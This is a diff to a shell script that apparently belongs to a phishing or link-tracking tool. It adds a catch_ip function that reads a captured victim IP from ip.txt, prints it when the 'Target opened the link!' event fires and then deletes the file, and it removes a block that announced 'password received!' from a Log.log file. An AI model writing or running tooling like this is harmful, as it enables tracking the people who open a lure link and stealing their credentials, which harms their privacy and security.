@@ -40,6 +40,17 @@ command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not instal
  
 
 }
+
+catch_ip() {
+
+ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
+IFS=$'\n'
+printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
+
+cat ip.txt
+
+}
+
 checkfound() {
 
 printf "\n"
@@ -49,15 +60,10 @@ while [ true ]; do
 
 if [[ -e "ip.txt" ]]; then
 printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
-
+catch_ip
+rm -rf ip.txt
 fi
 
-sleep 0.5
-
-if [[ -e "Log.log" ]]; then
-printf "\n\e[1;92m[\e[0m+\e[1;92m] password received!\e[0m\n"
-rm -rf Log.log
-fi
 sleep 0.5
 
 done 
